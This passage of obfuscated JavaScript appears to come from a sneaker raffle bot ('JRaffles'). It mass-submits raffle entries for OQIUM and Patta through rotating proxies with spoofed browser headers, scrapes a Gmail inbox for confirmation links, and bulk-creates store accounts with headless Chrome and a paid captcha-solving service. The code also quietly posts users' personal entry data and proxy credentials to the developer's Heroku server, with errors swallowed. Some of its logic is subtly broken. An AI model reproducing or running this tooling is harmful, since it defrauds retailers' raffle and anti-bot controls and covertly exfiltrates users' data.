                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0xd16ea3, _0x23318f, _0x2de3f2) {
                    var _0x21537c = _0x23318f, _0x485989 = 0x0;
                    for (var _0x3518aa = 0x0; _0x3518aa < _0x23318f['length']; _0x3518aa++) {
                        maxTasks = _0x4b1e6b['threads'];
                        while (_0x485989 >= maxTasks) {
                            await _0x590479(_0x4b1e6b['delay']);
                        }
                        async function _0x4f9847(_0x4cc4fe, _0x17dfa4, _0x705127, _0x429386) {
                            try {
                                await _0x46b8ee(_0x17dfa4, _0x429386);
                            } catch (_0x142de4) {
                                throw new Error(_0x142de4);
                            }
                            async function _0x4d19cc(_0x56141f, _0x88cab5, _0x3a262c, _0x48da48, _0x5d64bf) {
                                _0x485989++;
                                var _0x4a7185, _0x20b882 = {}, _0x19a904 = [], _0x3de76d = {}, _0x566af0 = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x2ab95e = Math['round'](Math['random']() * (_0x566af0['length'] - 0x1));
                                !_0x48da48 && (_0x48da48 = {});
                                if (_0x88cab5 != 'ver') {
                                    _0x39f641(_0x3a262c['name'] + '\x20Task\x20' + (_0x56141f + 0x1) + '\x20/\x20' + _0x48da48['length'] + '\x20||\x20File:\x20' + _0x4c637b + '\x20Proxies:\x20' + _0x1792f9), _0x19a904 = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x3d4e83
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x48da48[_0x56141f]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x4b1e6b['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x1701ba
                                            }
                                        ]
                                    }], _0x3de76d = { 'embeds': _0x19a904 }, _0x20b882 = _0x3a262c['data'], _0x20b882['data']['attributes']['email'] = '' + _0x48da48[_0x56141f]['Email'];
                                    if (_0x48da48[_0x56141f]['Size'] == 'RANDOM') {
                                    }
                                    _0x20b882['data']['attributes']['properties']['$first_name'] = '' + _0x48da48[_0x56141f]['FirstName'], _0x20b882['data']['attributes']['properties']['$last_name'] = '' + _0x48da48[_0x56141f]['LastName'], _0x20b882['data']['attributes']['properties']['$address1'] = _0x48da48[_0x56141f]['Address1'] + '\x20' + _0x48da48[_0x56141f]['Address2'] + '\x20' + _0x48da48[_0x56141f]['HouseNumber'], _0x20b882['data']['attributes']['properties']['$zip'] = '' + _0x48da48[_0x56141f]['Zip'], _0x20b882['data']['attributes']['properties']['$city'] = '' + _0x48da48[_0x56141f]['City'], _0x20b882['data']['attributes']['properties']['$country'] = '' + _0x48da48[_0x56141f]['Country'], _0x48da48[_0x56141f]['Size'] == 'RANDOM' ? _0x20b882['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x566af0[_0x2ab95e] : _0x20b882['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x48da48[_0x56141f]['Size'], _0x20b882['data']['attributes']['properties']['$phone_number'] = '' + _0x48da48[_0x56141f]['Phone'], _0x20b882['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x48da48[_0x56141f]['Follower'];
                                }
                                if (_0x4b1e6b['useRandomProxy'] = ![])
                                    var _0xbc8276 = _0x5d64bf[_0x56141f]['split'](':');
                                else
                                    var _0x23652e = Math['round'](Math['random']() * (_0x5d64bf['length'] - 0x1)), _0xbc8276 = _0x5d64bf[_0x23652e]['split'](':');
                                var _0x4c136c = {
                                    'jar': _0x456e65,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x3a262c['url'],
                                    'headers': _0x3a262c['headers'],
                                    'body': JSON['stringify'](_0x20b882),
                                    'proxy': 'http://' + _0xbc8276[0x2] + ':' + _0xbc8276[0x3] + '@' + _0xbc8276[0x0] + ':' + _0xbc8276[0x1]
                                };
                                return _0x88cab5 != 'ver' && (_0x4c136c['url'] = _0x3a262c['url'], _0x4c136c['headers'] = _0x3a262c['headers']), _0x88cab5 == 'ver' && (_0x4c136c['method'] = 'GET'), new Promise(function (_0x613907, _0x550255) {
                                    callback = async (_0x44befa, _0x3445f8, _0x5597a8) => {
                                        if (!_0x44befa && _0x3445f8['statusCode'] == 0xca || !_0x44befa && _0x3445f8['statusCode'] == 0xc8) {
                                            if (_0x88cab5 != 'ver') {
                                                var _0x1b0053 = await _0x54f36f(_0x48da48[_0x56141f], _0x3a262c, 'dev', ![]), _0x37152a = await _0x54f36f(_0x48da48[_0x56141f], _0x3a262c, 'pub', ![]);
                                                const _0x3b057a = {
                                                    'succesDEVMSG': { 'embeds': [_0x1b0053] },
                                                    'succesPUBMSG': { 'embeds': [_0x37152a] }
                                                };
                                                let _0x3652cd = _0x48da48[_0x56141f];
                                                try {
                                                    prxdata = {
                                                        'username': _0x3d4e83['replace']('#', ''),
                                                        'module': _0x3a262c['name'],
                                                        'entrydata': JSON['stringify'](_0x3652cd),
                                                        'proxy': '' + _0x5d64bf[_0x56141f]
                                                    };
                                                    var _0x70e8e1 = JSON['stringify'](prxdata);
                                                    let _0x506988 = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x49fa88['post']('https://jraffles.herokuapp.com/success', _0x70e8e1, _0x506988);
                                                } catch (_0x981a51) {
                                                }
                                                if (_0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '')
                                                    try {
                                                        await _0x1690f0(_0x4b1e6b['webhook'], _0x3b057a['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x590479(0xc8), await _0x1690f0(_0x4f7f5d, _0x3b057a['succesDEVMSG']), await _0x590479(0xc8);
                                                try {
                                                    await _0x1690f0(_0x4807c3, _0x3b057a['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x491fd3(_0x48da48[_0x56141f], _0x3a262c);
                                            }
                                            _0x485989--, _0x613907(console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0x3a262c['name'] + ']\x20Task\x20' + (_0x56141f + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x88cab5 != 'ver') {
                                                var _0x390373 = '' + _0x44befa, _0x2b7151 = await _0x54f36f(_0x48da48[_0x56141f], _0x3a262c, 'dev', !![], _0x390373), _0x41d55b = {};
                                                _0x41d55b['errorDEV'] = { 'embeds': [_0x2b7151] }, _0x549c32(_0x48da48[_0x56141f], _0x3a262c), _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x41d55b['errorDEV']), await _0x1690f0(_0x874ee1, _0x41d55b['errorDEV']);
                                            }
                                            _0x485989--, _0x550255(console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x3a262c['name'] + ']\x20Task\x20' + (_0x56141f + 0x1) + ':\x20' + _0x44befa)));
                                        }
                                    };
                                    try {
                                        _0x88cab5 != 'ver' && console['log'](_0x4786af() + '\x20[' + _0x3a262c['name'] + ']\x20Task\x20' + (_0x56141f + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x20b882['data']['attributes']['email']), _0x589558(_0x4c136c, callback);
                                    } catch (_0x260364) {
                                        console['log'](_0x4786af() + '\x20Task\x20' + (_0x56141f + 0x1) + ':\x20' + _0x260364);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x4d19cc(_0x429386, 'nor', _0x4cc4fe, _0x17dfa4, _0x705127), console['log'](_0x4786af() + '\x20[' + _0x4cc4fe['name'] + ']\x20Sleeping\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                            } catch (_0x899ec1) {
                            }
                        }
                        _0x4f9847(_0xd16ea3, _0x21537c, _0x2de3f2, _0x3518aa), await _0x590479(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x19941a, _0x2fc6b1, _0x3eaeca) {
                    var _0x2fc6b1 = [], _0x296d8f = ![];
                    async function _0x1c0417() {
                        var _0x47602f = new _0x54228e({
                            'user': _0x4b1e6b['masterMail'],
                            'password': _0x4b1e6b['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x29601c(_0x38a210) {
                            _0x47602f['openBox']('INBOX', ![], _0x38a210);
                        }
                        _0x47602f['once']('ready', function () {
                            _0x29601c(function (_0x33d966, _0x4919d4) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x33d966)
                                    throw _0x33d966;
                                _0x47602f['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x181674, _0x3caf3e) {
                                    if (!_0x3caf3e || !_0x3caf3e['length'])
                                        console['log'](_0x4786af() + '\x20[' + _0x19941a['name'] + ']\x20No\x20mails\x20found'), _0x47602f['end']();
                                    else {
                                        var _0x4a9532 = _0x47602f['seq']['fetch'](_0x3caf3e, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x4a9532['on']('message', function (_0x30ee99, _0x3d4395) {
                                            var _0x5d5634 = '(#' + _0x3d4395 + ')\x20';
                                            _0x30ee99['on']('body', function (_0x38ecd6, _0x430d73) {
                                                _0x4a3e33(_0x38ecd6, (_0x5a59ea, _0x317c01) => {
                                                    var _0x21fbb8 = _0x317c01['text']['split']('(')[0x1], _0x471dd2 = _0x21fbb8['split'](')')[0x0];
                                                    _0x2fc6b1['push'](_0x471dd2);
                                                });
                                            }), _0x30ee99['once']('end', function () {
                                            });
                                        }), _0x4a9532['once']('error', function (_0x211493) {
                                            console['log']('Fetch\x20error:\x20' + _0x211493), _0x296d8f = !![];
                                        }), _0x4a9532['once']('end', function () {
                                            _0x47602f['end'](), _0x296d8f = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x47602f['once']('error', function (_0x571243) {
                            console['log'](_0x571243), _0x296d8f = !![];
                        }), _0x47602f['once']('end', async function () {
                            _0x296d8f = !![];
                        }), _0x47602f['connect']();
                    }
                    async function _0x38471a(_0x2790f4, _0x9fc7ec, _0x1d48ca) {
                        for (var _0x36baae = 0x0; _0x36baae < _0x9fc7ec['length']; _0x36baae++) {
                            async function _0x2ab745(_0x3891b5, _0x4c653d, _0x3430bd, _0x50f0a0, _0x35bd13) {
                                var _0xfd6f3d, _0x63b5 = {}, _0x304a21 = [], _0x4ba41c = {}, _0x227147 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x419a29 = Math['round'](Math['random']() * (_0x227147['length'] - 0x1));
                                _0x50f0a0[_0x3891b5]['Size'] == 'RANDOM' && (_0x50f0a0[_0x3891b5]['Size'] = _0x227147[_0x419a29]);
                                !_0x50f0a0 && (_0x50f0a0 = {});
                                if (_0x4b1e6b['useRandomProxy'] = ![])
                                    var _0xf0977a = _0x35bd13[_0x3891b5]['split'](':');
                                else
                                    var _0x203a73 = Math['round'](Math['random']() * (_0x35bd13['length'] - 0x1)), _0xf0977a = _0x35bd13[_0x203a73]['split'](':');
                                var _0x54e22f = {
                                    'jar': _0x456e65,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x3430bd['url'],
                                    'headers': _0x3430bd['headers'],
                                    'body': JSON['stringify'](_0x63b5),
                                    'proxy': 'http://' + _0xf0977a[0x2] + ':' + _0xf0977a[0x3] + '@' + _0xf0977a[0x0] + ':' + _0xf0977a[0x1]
                                };
                                return _0x4c653d != 'ver' && (_0x54e22f['url'] = _0x3430bd['url'], _0x54e22f['headers'] = _0x3430bd['headers']), _0x4c653d == 'ver' && (_0x54e22f['method'] = 'GET', _0x54e22f['url'] = _0x50f0a0[_0x3891b5]), new Promise(function (_0x1cfe78, _0x5e3b5a) {
                                    callback = async (_0x5aeff6, _0x25c945, _0x870f3b) => {
                                        if (!_0x5aeff6 && _0x25c945['statusCode'] == 0xca || !_0x5aeff6 && _0x25c945['statusCode'] == 0xc8) {
                                            if (_0x4c653d != 'ver') {
                                                var _0x3f5b60 = await _0x54f36f(_0x50f0a0[_0x3891b5], _0x3430bd, 'dev', ![]), _0x2396d6 = await _0x54f36f(_0x50f0a0[_0x3891b5], _0x3430bd, 'pub', ![]);
                                                const _0x1618d3 = {
                                                    'succesDEVMSG': { 'embeds': [_0x3f5b60] },
                                                    'succesPUBMSG': { 'embeds': [_0x2396d6] }
                                                };
                                                if (_0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '')
                                                    try {
                                                        await _0x1690f0(_0x4b1e6b['webhook'], _0x1618d3['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x590479(0xc8), await _0x1690f0(_0x4f7f5d, _0x1618d3['succesDEVMSG']), await _0x590479(0xc8);
                                                try {
                                                    await _0x1690f0(_0x4807c3, _0x1618d3['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x491fd3(_0x50f0a0[_0x3891b5], _0x3430bd);
                                            }
                                            _0x1cfe78(console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0x3430bd['name'] + ']\x20Task\x20' + (_0x3891b5 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x4c653d != 'ver') {
                                                var _0x223b9d = '' + _0x5aeff6, _0x23ff1e = await _0x54f36f(_0x50f0a0[_0x3891b5], _0x3430bd, 'dev', !![], _0x223b9d), _0x452e9b = {};
                                                _0x452e9b['errorDEV'] = { 'embeds': [_0x23ff1e] }, _0x549c32(_0x50f0a0[_0x3891b5], _0x3430bd), _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x452e9b['errorDEV']), await _0x1690f0(_0x874ee1, _0x452e9b['errorDEV']);
                                            }
                                            _0x5e3b5a(console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x3430bd['name'] + ']\x20Task\x20' + (_0x3891b5 + 0x1) + ':\x20' + _0x5aeff6)));
                                        }
                                    };
                                    try {
                                        _0x4c653d != 'ver' ? console['log'](_0x4786af() + '\x20[' + _0x3430bd['name'] + ']\x20Task\x20' + (_0x3891b5 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x63b5['data']['attributes']['email']) : console['log'](_0x4786af() + '\x20[' + _0x3430bd['name'] + ']\x20Task\x20' + (_0x3891b5 + 0x1) + ':\x20Fetching\x20Response'), _0x589558(_0x54e22f, callback);
                                    } catch (_0x4a35b9) {
                                        console['log'](_0x4786af() + '\x20Task\x20' + (_0x3891b5 + 0x1) + ':\x20' + _0x4a35b9);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x2ab745(_0x36baae, 'ver', _0x2790f4, _0x9fc7ec, _0x1d48ca), console['log'](_0x4786af() + '\x20[' + _0x2790f4['name'] + ']\x20Sleeping\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                            } catch (_0xd3562d) {
                            }
                        }
                    }
                    try {
                        _0x1c0417();
                        while (!_0x296d8f) {
                            await _0x590479(0xfa0);
                        }
                        console['log']('Found\x20' + _0x2fc6b1['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x38471a(_0x19941a, _0x2fc6b1, _0x3eaeca);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x516061, _0x20f672, _0x511510) {
                    _0x145da3['use'](_0x109835()), _0x145da3['use'](_0x29f0f6({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4b1e6b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xa9f76a = 0x0; _0xa9f76a < _0x20f672['length']; _0xa9f76a++) {
                        var _0x116f0c = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3d4e83
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4b1e6b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1701ba
                                }
                            ]
                        }];
                        const _0x20b758 = { 'embeds': _0x116f0c };
                        _0x39f641(_0x516061['name'] + '\x20Task\x20' + (_0xa9f76a + 0x1) + '\x20/\x20' + _0x20f672['length'] + '\x20||\x20File:\x20' + _0x4c637b + '\x20Proxies:\x20' + _0x1792f9);
                        try {
                            await _0x46b8ee(_0x20f672, _0xa9f76a);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0xd6e71c = await _0x54f36f(_0x20f672[_0xa9f76a], _0x516061, 'acc', ![]);
                        const _0x1601e0 = { 'succesDEVMSG': { 'embeds': [_0xd6e71c] } };
                        if (_0x20f672[_0xa9f76a]['Email'] == '' || _0x20f672[_0xa9f76a]['FirstName'] == '' || _0x20f672[_0xa9f76a]['LastName'] == '') {
                            console['log'](_0x4786af() + '\x20[' + _0x514297[taskModule]['name'] + ']\x20Task\x20' + (_0xa9f76a + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x590479(0x7d0);
                            continue;
                        }
                        (_0x20f672[_0xa9f76a]['Password'] == '' || _0x20f672[_0xa9f76a] == undefined) && _0x20f672[_0xa9f76a]['Password'] == 'JRaffles23!';
                        if (_0x4b1e6b['useRandomProxy'] = ![])
                            var _0x8baa32 = _0x511510[_0xa9f76a]['split'](':');
                        else
                            var _0x3808bc = Math['round'](Math['random']() * (_0x511510['length'] - 0x1)), _0x8baa32 = _0x511510[_0x3808bc]['split'](':');
                        var _0x2922b5;
                        try {
                            _0x2922b5 = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x8baa32[0x0] + ':' + _0x8baa32[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2922b5 = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x8baa32[0x0] + ':' + _0x8baa32[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x372003 = await _0x2922b5['newPage']();
                            await _0x372003['authenticate']({
                                'username': '' + _0x8baa32[0x2],
                                'password': '' + _0x8baa32[0x3]
                            }), console['log'](_0x4786af() + '\x20[' + _0x516061['name'] + ']\x20Task\x20' + (_0xa9f76a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x372003['setRequestInterception'](!![]), _0x372003['on']('request', _0x49b9b5 => {
                                _0x49b9b5['resourceType']() === 'image' || _0x49b9b5['resourceType']() === 'font' || _0x49b9b5['resourceType']() === 'media' ? _0x49b9b5['abort']() : _0x49b9b5['continue']();
                            }), await _0x372003['goto']('https://patta.nl/account/register'), await _0x590479(0xbb8), await _0x372003['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x4786af() + '\x20[' + _0x516061['name'] + ']\x20Task\x20' + (_0xa9f76a + 0x1) + '\x20:\x20Filling\x20information'), await _0x372003['type']('#RegisterForm-FirstName', '' + _0x20f672[_0xa9f76a]['FirstName']), await _0x590479(0x226), await _0x372003['type']('#RegisterForm-LastName', '' + _0x20f672[_0xa9f76a]['LastName']), await _0x590479(0x226), await _0x372003['type']('#RegisterForm-email', '' + _0x20f672[_0xa9f76a]['Email']), await _0x590479(0x226), await _0x372003['type']('#RegisterForm-password', '' + _0x20f672[_0xa9f76a]['Password']), await _0x590479(0x226), console['log'](_0x4786af() + '\x20[' + _0x516061['name'] + ']\x20Task\x20' + (_0xa9f76a + 0x1) + '\x20:\x20Submitting..'), await _0x372003['$eval']('#RegisterForm', _0x49cfdc => _0x49cfdc['submit']()), await _0x590479(0x1f40);
                            try {
                                await _0x372003['waitForSelector']('.home-page-grid__collection'), await _0x590479(0x1f4), console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0x516061['name'] + ']\x20Task\x20' + (_0xa9f76a + 0x1) + '\x20:\x20Account\x20' + _0x20f672[_0xa9f76a]['Email'] + '\x20Generated!')), _0x768c3f['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x20f672[_0xa9f76a]['Email'] + ',' + _0x20f672[_0xa9f76a]['Password']), console['log'](_0x4fb298['yellow'](_0x4786af() + '\x20[' + _0x516061['name'] + ']\x20Task\x20' + (_0xa9f76a + 0x1) + '\x20:\x20Account\x20' + _0x20f672[_0xa9f76a]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x1601e0['succesDEVMSG']);
                                } catch {
                                }
                                await _0x1690f0(_0x48932d, _0x1601e0['succesDEVMSG']);
                            } catch (_0x427033) {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x514297[taskModule]['name'] + ']\x20Task\x20' + (_0xa9f76a + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x427033));
                            }
                        } catch (_0x2588de) {
                            console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x514297[taskModule]['name'] + ']\x20Task\x20' + (_0xa9f76a + 0x1) + '\x20:\x20' + _0x2588de));
                        } finally {
                            _0x2922b5 && _0x2922b5['close'](), console['log']('Waiting\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x4af4a6, _0x5ee613, _0x1ae202) {
                    _0x145da3['use'](_0x109835()), _0x145da3['use'](_0x29f0f6({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4b1e6b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5cfe9b = 0x0; _0x5cfe9b < _0x5ee613['length']; _0x5cfe9b++) {
                        var _0x4c004f;
                        if (_0x47e2b7 != 'yes')
                            var _0x47e2b7 = '', _0x1257eb = 0x0;
                        _0x39f641(_0x4af4a6['name'] + '\x20Task\x20' + (_0x5cfe9b + 0x1) + '\x20/\x20' + _0x5ee613['length'] + '\x20||\x20File:\x20' + _0x4c637b + '\x20Proxies:\x20' + _0x1792f9);
                        try {
                            await _0x46b8ee(_0x5ee613, _0x5cfe9b);
                        } catch {
                            _0x47e2b7 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x5ee613[_0x5cfe9b]['Email'] == '' || _0x5ee613[_0x5cfe9b]['Password'] == '' || _0x5ee613[_0x5cfe9b]['FirstName'] == '' || _0x5ee613[_0x5cfe9b]['LastName'] == '') {
                            console['log'](_0x4786af() + '\x20[' + _0x514297[taskModule]['name'] + ']\x20Task\x20' + (_0x5cfe9b + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x4b1e6b['useRandomProxy'] = ![])
                            var _0x1f7b29 = _0x1ae202[_0x5cfe9b]['split'](':');
                        else
                            var _0x4562c9 = Math['round'](Math['random']() * (_0x1ae202['length'] - 0x1)), _0x1f7b29 = _0x1ae202[_0x4562c9]['split'](':');
                        var _0x245fcf;
                        try {
                            _0x245fcf = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1f7b29[0x0] + ':' + _0x1f7b29[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x245fcf = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1f7b29[0x0] + ':' + _0x1f7b29[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x262d6d = await _0x245fcf['newPage']();
                            await _0x262d6d['authenticate']({
                                'username': '' + _0x1f7b29[0x2],
                                'password': '' + _0x1f7b29[0x3]
                            }), console['log'](_0x4786af() + '\x20[' + _0x4af4a6['name'] + ']\x20Task\x20' + (_0x5cfe9b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x262d6d['setRequestInterception'](!![]), _0x262d6d['on']('request', _0x5ea229 => {
                                _0x5ea229['resourceType']() === 'image' || _0x5ea229['resourceType']() === 'font' || _0x5ea229['resourceType']() === 'media' ? _0x5ea229['abort']() : _0x5ea229['continue']();
                            }), await _0x262d6d['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x262d6d['waitForSelector']('#CustomerEmail'), console['log'](_0x4786af() + '\x20[' + _0x4af4a6['name'] + ']\x20Task\x20' + (_0x5cfe9b + 0x1) + '\x20:\x20Logging\x20in..'), await _0x262d6d['type']('#CustomerEmail', '' + _0x5ee613[_0x5cfe9b]['Email']), await _0x590479(0x12c), await _0x262d6d['type']('#CustomerPassword', '' + _0x5ee613[_0x5cfe9b]['Password']), await _0x590479(0x226), await _0x262d6d['$eval']('#customer_login', _0x5c9e32 => _0x5c9e32['submit']());
                            try {
                                await _0x262d6d['waitForSelector']('#orders'), await _0x590479(0x4b0);
                            } catch {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x4af4a6['name'] + ']\x20Task\x20' + (_0x5cfe9b + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x262d6d['goto']('' + _0x5ee613[_0x5cfe9b]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x590479(0xbb8), console['log'](_0x4786af() + '\x20[' + _0x4af4a6['name'] + ']\x20Task\x20' + (_0x5cfe9b + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x262d6d['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x4af4a6['name'] + ']\x20Task\x20' + (_0x5cfe9b + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
